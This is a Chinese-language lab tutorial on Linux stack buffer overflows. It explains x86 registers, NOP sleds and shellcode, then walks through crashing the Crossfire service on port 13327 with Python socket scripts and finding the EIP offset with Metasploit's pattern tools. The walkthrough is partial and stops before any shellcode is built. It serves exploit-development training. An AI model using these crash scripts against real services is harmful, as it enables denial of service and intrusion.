linux逆向工具：edb-debug
寄存器：
4个数据寄存器(EAX、EBX、ECX和EDX)
2个变址和指针寄存器(ESI和EDI)
2个指针寄存器(ESP和EBP)
EAX 是”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。

EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。

ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。

EDX 则总是被用来放整数除法产生的余数。

esp：寄存器存放当前线程的栈顶指针

ebp：寄存器存放当前线程的栈底指针

eip：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，
从EIP寄存器中读取下一条指令的内存地址，然后继续执行。

linux下缓冲区溢出的攻击原理：linux靶机服务器上运行一个服务，并开放一个端口，
攻击机获取到了这个服务的程序并获取到了靶机的IP地址和该服务的端口，
先在攻击机上通过逆向程序调试该服务程序，找到缓冲区溢出的漏洞，并
定位该漏洞的位置，然后通过编写python程序向靶机服务端口发送请求，
使靶机服务发生缓冲区溢出并执行发送的请求中包含的一段shellcode，
从而获取到靶机的最高权限。

溢出（buffer）：用户的输入长度超出栈中对它最大长度的预期，即分配的内存大小。

返回地址（ret）：用于直接跳转到栈顶部的4B的地址。

Padding（填充）：在shellcode之前的一系列NOP（无操作）指令，它使攻击者直接跳转到那里去的地址时，能放宽的精度要求。
只要他跳转到NOP链的任意地方，可直接划到shellcode那里。

shellcode：一小段用汇编语言编写的机器码。可以用Metasploit框架生成shellcode。

如何发现漏洞？

源码审计（代码审计），逆向工程（动态调试），模糊测试------
（向程序堆栈半随机的数据，根据内存变化判断溢出，数据生成器--生成随机，半随机数据，测试工具--识别溢出漏洞）

实例操作：
运行服务端程序
通过nststat -pantu 命令来获取该服务开放的端口和进程PID
运行edb对进程进行检测
运行第一个测试程序：
import socket
host = "127.0.0.1"
crash = "\x41" * 4379 crossfire必须在发送数值大小在一个固定数值的时候才能发生缓冲区溢出，只有当发送4379字符时，才能精确到溢出位置
buffer = "\x11(setup sound " +crash+ "\x90\x90#)"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13327)) 端口号
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"
第一次测试后程序成功崩溃，得到的结果是发送4379个字符能使之发生溢出，然后重启服务并且用edb监测
使用第二个脚本：
import socket
host = "127.0.0.1"
crash = ""  # crash的值是大量的不重复的字母数字组合用于精确确定位置
buffer = "\x11(setup sound" + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host, 13327))  # host后面是连接的端口号
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*]Payload sent")
输入./usr/share/metasploit-‐framework/tools/exploit/pattern_create.rb -l 4379 命令使之生成4379个有规律但不重复的字符串
用于精确确定溢出位置，添加到第二个脚本的crash中，运行。
edb弹出报错：46367046   ，该四个字符是4379个字符里面中的四个相连的字符
输入./usr/share/metasploit-‐framework/tools/exploit/pattern_offset.rb -q 46367046
[*] Exact match at offset 4368
得出精确位置在第4368个字符上 说明溢出时EIP里面的字符是第4368的字符
